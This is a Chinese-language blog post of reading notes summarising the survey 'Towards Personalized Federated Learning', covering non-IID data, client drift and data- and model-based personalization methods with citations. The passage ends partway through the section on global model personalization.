<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>【阅读笔记】Towards Personalized Federated Learning个性化联邦综述 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【阅读笔记】Towards Personalized Federated Learning个性化联邦综述</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul>
<li><a href="#_1">前言</a></li>
<li><a href="#1__39">1 背景</a></li>
<li>
<ul>
<li><a href="#11__40">1.1 机器学习、联邦学习</a></li>
<li><a href="#12__49">1.2 促进个性化联邦学习的动机</a></li>
</ul>
  </li>
<li><a href="#2__88">2 个性化联邦学习的策略</a></li>
<li>
<ul>
<li><a href="#21__110">2.1 全局模型个性化</a></li>
<li>
<ul>
<li><a href="#211__112">2.1.1 基于数据的方法</a></li>
<li>
<ul>
<li><a href="#2111___Data_Augmentation_126">2.1.1.1 数据增强 Data Augmentation</a></li>
<li><a href="#2112___Client_Selection_140">2.1.1.2 挑选客户端 Client Selection</a></li>
</ul>
    </li>
<li><a href="#212__153">2.1.2 基于模型的方法</a></li>
<li>
<ul>
<li><a href="#2121__Regularized_Local_Loss_168">2.1.2.1 增加模型局部损失正则项 Regularized Local Loss</a></li>
<li><a href="#2122__Metalearning_185">2.1.2.2 元学习 Meta-learning</a></li>
<li><a href="#2123__Transfer_learning_197">2.1.2.3 迁移学习 Transfer learning</a></li>
</ul>
    </li>
<li><a href="#213__211">2.1.3 总结</a></li>
</ul>
   </li>
<li><a href="#22__250">2.2 学习个性化模型</a></li>
<li>
<ul>
<li><a href="#221__254">2.2.1 基于架构的方法</a></li>
<li>
<ul>
<li><a href="#2211__Parameter_Decoupling_267">2.2.1.1 参数解耦 Parameter Decoupling</a></li>
<li><a href="#2212__Knowledge_Distillation_283">2.2.1.2 知识蒸馏 Knowledge Distillation</a></li>
</ul>
    </li>
<li><a href="#222__299">2.2.2 基于相似性的方法</a></li>
<li>
<ul>
<li><a href="#2221__Multitask_learning_MTL_316">2.2.2.1 多任务学习 Multitask learning (MTL)</a></li>
<li><a href="#2222__model_interpolation_326">2.2.2.2 模型插值 model interpolation</a></li>
<li><a href="#2222__clustering_336">2.2.2.2 聚类 clustering</a></li>
</ul>
    </li>
<li><a href="#223__353">2.2.3 总结</a></li>
</ul>
  </li>
</ul>
  </li>
<li><a href="#3_PFL_no_IID_397">3 PFL实验评价设计 （no I.I.D的分类以及解决方法）</a></li>
<li><a href="#4_PFL_423">4 PFL评估指标</a></li>
<li><a href="#_457">总结</a></li>
<li>
<ul><li><a href="#_463">参考文章</a></li></ul>
 </li>
</ul>
</div>
<p></p> 
<h1>
<a id="_1"></a>前言</h1> 
<p>在阅读这篇论文之前，我们需要阅读另一篇文章，以了解为什么需要个性化联邦，以及个性化联邦是在解决什么问题。<br> <strong>Advances and Open Problems in Federated Learning</strong> 联邦学习研究的进展与开放问题<br> <img src="https://images2.imgbox.com/81/7b/CvSN5B7C_o.png" alt="在这里插入图片描述" width="600" height="400"><br> 最新在2021年修订，其中的第3章第1节， Non-IID Data in Federated Learning 介绍了联邦学习中的非独立同分布数据。<br> <img src="https://images2.imgbox.com/d1/21/8AtBa3SR_o.png" alt="在这里插入图片描述"><br> 介绍了五种no I.I.D.的情况：</p> 
<ol>
<li> <p><strong>Feature distribution skew 特征分布偏差（协变量偏移）</strong><br> 即使P(y|x)是共享的，边际分布Pi(x)可能因不同的客户而不同。<br> e.g. 在手写识别领域中，写相同单词的用户可能仍然有不同的笔画宽度、倾斜度等。</p> </li>
<li> <p><strong>Lable distribution skew 标签分布偏差（先验概率偏移）</strong><br> 即使P(x|y)是相同的，边际分布Pi(y)也可能不同。<br> e.g. 当客户被绑定到特定的地理区域时，不同客户的标签分布也不同——袋鼠只在澳大利亚或动物园；一个人的脸只再世界上少数几个地方；对于移动设备键盘，某些表情符号被一个人使用，而不被其他人使用。</p> </li>
<li> <p><strong>Same label, different features 相同的标签，不同的特征（概念漂移）</strong><br> 即使P(y)是共享的，条件分布Pi(x|y)也可能在不同的客户端之间有所不同。相同的标签y可以对不同的客户端有非常不同的特征x。<br> e.g. 由于文化差异、天气影响、生活水平等原因。例如，世界各地的家庭形象可能差别很大，服装的种类也差别很大。即使是在美国境内，冬天停放的汽车的照片也只会在美国的某些地区被雪覆盖。同样的标签在不同的时间和不同的时间尺度上也可能看起来非常不同：昼夜、季节影响、自然灾害、时尚和设计趋势等等。</p> </li>
<li> <p><strong>Same features, different label 相同的特征，不同的标签 （概念漂移）</strong><br> 条件分布Pi(y|x)可能在不同的客户端之间有所不同，即使P(x)相同。由于个人偏好，训练数据项中相同的特征向量可以有不同的标签。<br> e.g. 例如，反映情绪或下一个词预测器的标签有个人和区域差异。</p> </li>
<li> <p><strong>Quantity skew or unbalancedness 数量倾斜或不平衡</strong><br> e.g. 不同的客户端可以拥有非常不同的数据量。</p> </li>
</ol> 
<p>下面开始进入正题：</p> 
<p>题目：<strong>Towards Personalized Federated Learning</strong></p> 
<p>收录于：IEEE Transactions on Neural Networks and Learning Systems (Mar 28, 2022)</p> 
<p>作者单位：NTU，Alibaba Group，SDU，HKUST，WeBank</p> 
<p>链接：https://arxiv.org/pdf/2103.00710.pdf</p> 
<h1>
<a id="1__39"></a>1 背景</h1> 
<h2>
<a id="11__40"></a>1.1 机器学习、联邦学习</h2> 
<p>机器学习，联邦学习大家也比较熟知，就不介绍，放两张图来表示这二者之间的差别。<br> 不了解联邦学习可以阅读下下面的文章：<br> <a href="https://zhuanlan.zhihu.com/p/382177421">通俗易懂讲解联邦学习</a></p> 
 
 <img src="https://images2.imgbox.com/c0/bb/keNuCYYs_o.png" width="300"> 
 <img src="https://images2.imgbox.com/17/f8/6A7uKs0C_o.png" width="300"> 
 
<h2>
<a id="12__49"></a>1.2 促进个性化联邦学习的动机</h2> 
<p>联邦学习的成功依赖于一个重要的假设：<strong>每个数据中心的数据是独立同分布（IID）</strong>。实验表明在non-IID的数据上，联邦学习模型的表现非常差，在前言中我们提到了no I.I.D的几种情况。<br> 一般的FL方法面临着两个基本的挑战：(i)高度异构数据的收敛性差，以及(ii)缺乏个性化解决方案。在存在异构本地数据分布的情况下，这些问题恶化了全局FL模型在单个客户机上的性能，甚至可能抑制受影响的客户机加入FL流程。与传统的FL相比，PFL的研究试图解决这两个挑战。</p> 
<ol><li>
<strong>对异构数据的收敛性较差</strong><br> 当对非独立的同分布(非IID)数据进行学习时，FedAvg的准确性显著降低。这种性能下降归因于客户端漂移的现象，这是由于对非IID的本地数据分布进行了一轮又一轮的本地训练和同步的结果。下图显示了客户端漂移对IID和非IID数据的影响。</li></ol> 
 
 <img src="https://images2.imgbox.com/af/4d/3cvblcro_o.png"> 
 <br> 
 <div>
  客户端漂移对IID和非IID数据的影响
 </div> 
 
<p>在FedAvg中，服务器更新向客户端优化的平均值移动。<strong>当数据为IID时</strong>，平均模型接近全局最优<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         ∗
        
       
      
      
       w^∗
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6887em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>，因为它与局部最优<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         1
        
        
         ∗
        
       
      
      
       w^∗_1
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.9368em;vertical-align: -0.2481em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-left: -0.0269em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2481em"><span class=""></span></span></span></span></span></span></span></span></span></span>和<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         2
        
        
         ∗
        
       
      
      
       w^*_2
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.9368em;vertical-align: -0.2481em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-left: -0.0269em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2481em"><span class=""></span></span></span></span></span></span></span></span></span></span>的距离相等；然而，<strong>当数据是非IID的时</strong>，全局最优<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         ∗
        
       
      
      
       w^∗
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6887em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>与局部最优的距离并不相等。在这个图中，<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         ∗
        
       
      
      
       w^∗
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6887em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>更接近于<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         2
        
        
         ∗
        
       
      
      
       w^*_2
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.9368em;vertical-align: -0.2481em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-left: -0.0269em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2481em"><span class=""></span></span></span></span></span></span></span></span></span></span>。因此，平均模型<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         
          t
         
         
          +
         
         
          1
         
        
       
      
      
       w^{t+1}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.8141em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.8141em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span>将远离全局最优<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         w
        
        
         ∗
        
       
      
      
       w^∗
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6887em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6887em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>，并且全局模型不收敛到其真正的全局最优。由于FedAvg算法在非IID数据上遇到收敛问题，需要仔细调整超参数（例如，学习速率衰减），以提高学习稳定性。</p> 
<ol start="2"><li>
<strong>缺乏个性化解决方案</strong><br> 在普通的FL设置中，一个单一的全局共享模型被训练以适应“平均客户端”。因此，全局模型将不能很好地推广到与全局分布非常不同的局部分布中。对于经常面临非IID本地数据集的实际应用程序来说，拥有一个单一的模型往往是不够的。e.g.以应用FL为移动键盘开发语言模型为例，由于不同的世代、语言和文化的细微差别，来自不同人口统计数据的用户很可能有不同的使用模式。某些单词或表情符号很可能主要被特定的用户群体使用。对于这样的场景，需要为每个用户提供更适合的单词建议预测才是有意义的。</li></ol> 
<p><strong>个性化联邦学习</strong>就是为了解决联邦学习中的：</p> 
<ul>
<li>在异质性强（non-IID）的数据上收敛慢，性能差。</li>
<li>模型对于本地任务或者数据集缺乏个性化。</li>
</ul> 
 
 <img src="https://images2.imgbox.com/5e/36/Hv8fuGC4_o.png"> 
 <br> 
 <div>
  个性化联邦学习解决了联邦学习对于non-IID性能的下降。包含（1）全局模型个性化；（2）学习个性化模型
 </div> 
 
<h1>
<a id="2__88"></a>2 个性化联邦学习的策略</h1> 
<p>“Towards Personalized Federated Learning”一文将个性化联邦学习（PFL）分为两类：</p> 
<ol>
<li> <p><strong>全局模型个性化</strong>（Global Model Personalization）：第一阶段，训练一个共享的全局FL模型；第二阶段，在本地的数据上进行额外的训练，达到适应个性化的目的。在这一类模型中，主要是解决异质性强的数据问题（no I.I.D）<br> <strong>Data-based</strong>:通过减少客户数据集之间的统计异质性来缓解客户漂移问题<br> <strong>Model-based</strong>:学习一个强大的全局模型，用于单个客户的个性化或提高局部模型的适应性能</p> </li>
<li> <p><strong>学习个性化模型</strong>（Learning Personalized Model）：第二种策略解决了解决方案个性化的挑战。与训练单一全局模型的全局模型个性化策略相比，这一类的方法训练个体个性化的FL模型。其目标是通过修改FL模型聚合过程来建立个性化的模型。这是通过在FL设置中应用不同的学习模式来实现的。（这句话可能有点难以理解，后面具体介绍完方法和思路可能就会明白）<br> <strong>Architectrure-based</strong>:为每个客户机提供个性化的模型体系结构<br> <strong>Similarity-based</strong>:利用客户关系来提高个性化模型的性能，其中为相关客户构建类似的个性化模型</p> </li>
</ol> 
 
 <img src="https://images2.imgbox.com/66/a1/BlUZu9ZO_o.png"> 
 <br> 
 <div>
  个性化联邦学习分类
 </div> 
 原文的分类标准是根据 (i)解决数据异质性和 (ii)达成模型个性化 这两个需求进行划分的。但是或许这种划分并不是绝对的：Learning Personalized Models也可也解决数据异质性，反之亦然。 
<h2>
<a id="21__110"></a>2.1 全局模型个性化</h2> 
<p>全局模型个性化目标是解决FL在non-IID数据上训练的难点。包含（i）基于数据的方法和（ii）基于模型的方法。</p> 
<h3>
<a id="211__112"></a>2.1.1 基于数据的方法</h3> 
<p>由于对异构数据的联合训练引起的客户端漂移问题，基于数据的方法旨在减少客户端数据分布的统计异质性。这有助于提高全局FL模型的泛化性能。简而言之，就是将no I.I.D数据转化成I.I.D。</p> 
 
 <img src="https://images2.imgbox.com/c7/49/EzIAvHea_o.png"> 
 <br> 
 <div>
  基于数据的全局模型个性化：（1）数据增强 （2）挑选客户端
 </div> 
 
<h4>
<a id="2111___Data_Augmentation_126"></a>2.1.1.1 数据增强 Data Augmentation</h4> 
<p>由于训练数据的IID特性是统计学习理论中的一个基本假设，因此，在机器学习领域已经广泛的研究了增强数据统计同质性的数据扩充方法。已经提出了涉及合成数据生成的过采样技术(如smote和ADASYN)和欠采样技术(如Tomek link)，以减少数据不平衡。然而，用于传统机器学习场景的数据增强方法不能直接用于联邦学习场景，因为属于客户机中的数据是分布式的和私有的。</p> 
<p><strong>FL中的数据增强非常具有高度挑战性，因为它通常需要某种形式的数据共享，或者需要获取依赖于代表整体数据分布的代理数据集</strong></p> 
<blockquote> 
 <ul>
<li>Zhao，Li等人提出了一种数据共享策略，该策略将少量的全局数据按类别平衡分配给每个客户端。他们的实验表明，添加少量数据可能有显著的精度提高（30%~）。<br> Y. Zhao, M. Li, L. Lai, N. Suda, D. Civin, and V. Chandra, “Federated Learning with Non-IID Data,” arXiv:1806.00582, 2018.</li>
<li>Jeong，Oh等人提出了FAug，这是一种联邦增强方法，在FL服务器上训练生成对抗网络(GAN)模型。将少数群体的一些数据样本上传到服务器上以训练GAN模型。然后，将训练好的GAN模型分发给每个客户端，生成额外的数据，以增加其本地数据，从而生成一个I.I.D.数据集。<br> E. Jeong, S. Oh, H. Kim, J. Park, M. Bennis, and S.-L.Kim, “Communication-efficient on-device machine learning: Federated distillation and augmentation under non-iid private data,” arXiv:1811.11479, 2018.</li>
<li>Duan，liu等人提出了Astraea，一个自平衡的FL框架，通过使用基于z分数的数据增强和本地数据的下采样来处理类的不平衡。FLserver需要关于客户端本地数据分布的统计信息（例如，类大小、平均值和标准偏差值）。<br> M. Duan, D. Liu, X. Chen, R. Liu, Y. Tan, and L. Liang, “Self-Balancing Federated Learning With Global Imbalanced Data in Mobile Systems,” IEEE TPDS, vol. 32, no. 1, pp. 59–71, 2021.</li>
<li>Wu，Chen等人提出了FedHome算法，它使用FL训练生成卷积自编码器(GCAE)模型。在FL过程结束时，每个客户端对本地增强的类平衡数据集执行进一步的个性化。该数据集是通过基于局部数据对编码器网络的低维特征执行烟雾算法来生成的。<br> Q. Wu, X. Chen, Z. Zhou, and J. Zhang, “Fedhome: Cloud-edge based personalized federated learning for in-home health monitoring,” IEEE TMC, 2020.</li>
</ul> 
</blockquote> 
<h4>
<a id="2112___Client_Selection_140"></a>2.1.1.2 挑选客户端 Client Selection</h4> 
<p><strong>设计FL客户端选择机制，使其能够从更均匀的数据分布中进行采样，目的是提高模型的泛化性能。</strong></p> 
<blockquote> 
 <ul>
<li>Wang，Kaplan等人提出了FAVOR，为每一轮培训选择一个参与客户的子集，以减轻非iid数据带来的偏差。设计了一个用于客户选择的深度Q-lerning公式，目的是在最小化通信轮数的同时实现最大的准确性。<br> H. Wang, Z. Kaplan, D. Niu, and B. Li, “Optimizing Federated Learning on Non-IID Data with Reinforcement Learning,” in IEEE<br> INFOCOM, 2020, pp. 1698–1707.</li>
<li>Yang，Wang等人人提出了一个基于多臂老虎机公式的客户选择算法，以选择具有最小类别不平衡的客户子集。通过比较提交给FL服务器的本地梯度更新与驻留在服务器上的平衡代理数据集推断出的梯度之间的相似性来估计本地类分布。<br> M. Yang, X. Wang, H. Zhu, H. Wang, and H. Qian, “Federated learning with class imbalance reduction,” in IEEE EUSIPCO, 2021, pp. 2174–2178.</li>
<li>Chai，Ali等人提出了一种基于层级的FL系统(TiFL)，该系统根据训练性能将客户分成不同的层级。该算法通过优化精度和训练时间，自适应地从每个训练轮的同一层中选择参与的客户。这有助于缓解由数据和资源异构性引起的性能问题。<br> Z. Chai, A. Ali, S. Zawad, S. Truex, A. Anwar, N. Baracaldo, Y. Zhou,H. Ludwig, F. Yan, and Y. Cheng, “Tifl: A tier-based federated learning system,” in ACM HPDC, 2020, pp. 125–136.</li>
<li>Li，Duan等人提出了FedSAE，一个自适应的FL系统，在每个训练场中自适应地选择局部训练损失较大的客户，以加速全局模型的收敛。还提出了一个预测每个客户可承受的工作量的机制，以便动态调整每个客户的局部训练纪元的数量，以提高设备的可靠性。<br> L. Li, M. Duan, D. Liu, Y. Zhang, A. Ren, X. Chen, Y. Tan, and C. Wang, “Fedsae: A novel self-adaptive federated learning framework in heterogeneous systems,” in IJCNN, 2021.</li>
</ul> 
</blockquote> 
<h3>
<a id="212__153"></a>2.1.2 基于模型的方法</h3> 
<p>虽然<strong>基于数据的方法</strong>通过<strong>减轻客户端漂移</strong>问题来提高了全局FL模型的收敛性，但它们通常需要<strong>修改局部数据分布</strong>。这可能会<strong>导致与客户行为的固有多样性相关的有价值的信息的丢失</strong>。这些信息对于为每个客户机提供个性化的全局模型非常有用。<br> 基于模型的全局模型个性化的FL方法，其目的是学习一个强大的全局FL模型，以便将来对每个客户进行个性化处理，或者提高局部模型的适应性。</p> 
 
 <img src="https://images2.imgbox.com/95/1a/KVS1fhLH_o.png"> 
 <br> 
 <div>
  基于模型的个性化：（1）正则化 （2）元学习 （3）迁移学习 
 </div> 
 
<h4>
<a id="2121__Regularized_Local_Loss_168"></a>2.1.2.1 增加模型局部损失正则项 Regularized Local Loss</h4> 
<p>模型正则化是在训练机器学习模型时<strong>防止过拟合和提高收敛性</strong>的常用策略。在FL中，正则化技术可以应用于<strong>限制局部更新的影响</strong>。这提高了收敛稳定性和全局模型的泛化，进而可以用于产生更好的个性化模型。<br> <strong>全局和局部模型之间比较</strong>：一些工作在全局和局部模型之间实现正则化，以解决由于统计数据的异质性而在FL中普遍存在的客户端漂移问题。</p> 
<blockquote> 
 <ul>
<li>FedProx对本地子问题引入了一个近似项，它考虑了全局FL模型和局部模型之间的差异，以调整局部更新的影响。<br> T. Li, A. K. Sahu, M. Zaheer, and et al., “Federated Optimization in Heterogeneous Networks,” MLSys, vol. 2, pp. 429–450, 2020.</li>
<li>FedCL进一步考虑了使用持续学习领域的弹性权重整合（EWC）的正则化局部损失函数中的参数重要性。然后，它们被转移到客户端，在那里进行惩罚步骤，以防止全局模型的重要参数在适应全局模型和客户的本地数据时被改变。这样做可以减轻本地和全局模型之间的权重差异，同时保留全局模型的知识以提高泛化能力。<br> J. Kirkpatrick, R. Pascanu, and N. Rabinowitz et al., “Overcoming catastrophic forgetting in neural networks,” PNAS, vol. 114, no. 13,pp. 3521–3526, 2017.</li>
<li>SCAFFOLD使用方差减少来缓解客户漂移的影响，导致局部和全局模型之间的权重差异。估计了全局(v)模型和局部(<span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           v
          
          
           c
          
         
        
        
         v_c
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em"><span class="" style="margin-left: -0.0359em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>)模型的更新方向。差异(v−<span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           v
          
          
           c
          
         
        
        
         v_c
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em"><span class="" style="margin-left: -0.0359em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>)作为本地损失函数的一个组件添加，以纠正本地更新。<br> S. P. Karimireddy, S. Kale, M. Mohri, S. J. Reddi, S. U. Stich, and A. T.<br> Suresh, “SCAFFOLD: Stochastic Controlled Averaging for Federated Learning,” in ICML, 2020, pp. 5132–5143.</li>
</ul> 
</blockquote> 
<p><strong>历史局部模型快照之间比较</strong>：</p> 
<blockquote> 
 <ul><li>基于对比学习的FL-MOON被提出，MOON的目标是减少由局部模型和全局模型学习的表征之间的距离（即减轻权重分歧），并增加一个给定的局部模型和它的前一个局部模型之间学习的表征之间的距离（即加快融合）。这种新兴的方法使每个客户都能学习到接近全局模型的表征，以尽量减少局部模型的分歧。它还通过鼓励本地模型在前一版本的基础上进行改进来加速学习。<br> Q. Li, B. He, and D. Song, “Model-contrastive federated learning,” in CVPR, 2021, pp. 10 713–10 722.</li></ul> 
</blockquote> 
<h4>
<a id="2122__Metalearning_185"></a>2.1.2.2 元学习 Meta-learning</h4> 
<p>元学习俗称 “学会学习”，元学习的目的是通过接触各种任务（即数据集）来改进学习算法。基于优化的元学习算法，如模型无关的元学习（MAML）和Reptile，因其在新的异质任务上的良好泛化和快速适应而闻名。它们也是模型不可知的，可以应用于任何基于梯度下降的方法，使其能够应用于监督学习和强化学习。<br> <a href="https://zhuanlan.zhihu.com/p/136975128">一文入门元学习Meta-learning</a></p> 
<blockquote> 
 <ul>
<li>元学习算法的运行分为两个阶段：元训练和元测试。Jiang等作者将MAML中的元训练步骤映射到FL全局模型训练过程中，将元测试步骤映射到FL个性化过程中，其中在局部适应过程中对局部数据进行了几步梯度下降。他们还表明，FedAvg与Reptile算法类似，当所有客户拥有同等数量的本地数据时，实际上是等价的。鉴于元学习和FL算法表述的相似性，元学习技术可以应用于改善全局FL模型，同时在客户端上实现快速个性化.<br> Y. Jiang, J. Koneˇcn´y, K. Rush, and S. Kannan, “Improving Federated Learning Personalization via Model Agnostic Meta Learning,” arXiv:1909.12488, 2019.</li>
<li>个人目前对元学习还不是很了解，后面还有几篇论文，一并附上，后期会专门写一下FL中元学习的内容</li>
<li>A. Fallah, A. Mokhtari, and A. Ozdaglar, “Personalized federated learning with theoretical guarantees: A model-agnostic meta-learning approach,” in NeurIPS, vol. 33, 2020, pp. 3557–3568.</li>
<li>——, “On the convergence theory of gradient-based model-agnostic meta-learning algorithms,” in AISTATS, 2020, pp. 1082–1092.</li>
<li>C. T. Dinh, N. H. Tran, and T. D. Nguyen, “Personalized federated learning with moreau envelopes,” in NeurIPS, vol. 33, 2020, pp.21 394–21 405.</li>
<li>M. Khodak, M.-F. Balcan, and A. Talwalkar, “Adaptive Gradient-Based Meta-Learning Methods,” in NeurIPS, vol. 32, 2019, pp. 5917–5928.</li>
</ul> 
</blockquote> 
<h4>
<a id="2123__Transfer_learning_197"></a>2.1.2.3 迁移学习 Transfer learning</h4> 
<p>迁移学习(TL)通常用于非联邦环境中的模型个性化。它的目标是将知识从源域转移到目标域，这两个域通常是不同的，但都是相关的。TL是一种有效的方法，它利用了来自预先训练过的模型的知识转移，从而避免了从头开始构建模型的需要。<br> <strong>基于tl的PFL方法也出现了</strong></p> 
<blockquote> 
 <ul>
<li>FedMD是一个基于TL和知识蒸馏的FL框架，供客户使用自己的私有数据设计独立的模型。在FL训练和知识蒸馏阶段之前，TL首先使用一个在公共数据集上预先训练过的模型进行。然后，每个客户端都会根据其私有数据对该模型进行微调。<br> D. Li and J. Wang, “Fedmd: Heterogenous federated learning via model distillation,” arXiv:1910.03581, 2019.</li>
<li>在FL中，有几项研究在医疗保健领域使用TL进行模型个性化(例如，FedHealth和FedSteg)。<br> Y. Chen, X. Qin, J. Wang, C. Yu, and W. Gao, “Fedhealth: A federated transfer learning framework for wearable healthcare,” IEEE Intell. Syst.,vol. 35, no. 4, pp. 83–93, 2020.<br> H. Yang, H. He, W. Zhang, and X. Cao, “FedSteg: A Federated Transfer Learning Framework for Secure Image Steganalysis,” IEEE TNSE,vol. 8, no. 2, pp. 1084–1094, 2020.</li>
</ul> 
</blockquote> 
<p>训练过程一般包括三个步骤：1）通过FL训练全局模型；2）通过在本地数据上适应全局模型来训练本地模型；3）通过TL使用全局模型完善本地模型来训练个性化模型。为了实现领域适应性，通常在softmax层之前添加一个对齐层，如相关对齐（CORAL）层，以适应源域和目标域的二阶统计数据。</p> 
<blockquote> 
 <p>B. Sun, J. Feng, and K. Saenko, “Return of frustratingly easy domain adaptation,” in AAAI, 2016, pp. 2058–2065.</p> 
</blockquote> 
<h3>
<a id="213__211"></a>2.1.3 总结</h3> 
 
 <img src="https://images2.imgbox.com/69/0f/dyVBYdch_o.png"> 
 <br> 
 <div>
  全局模型个性化设计中的个性化技术总结 
 </div> 
 
<ul>
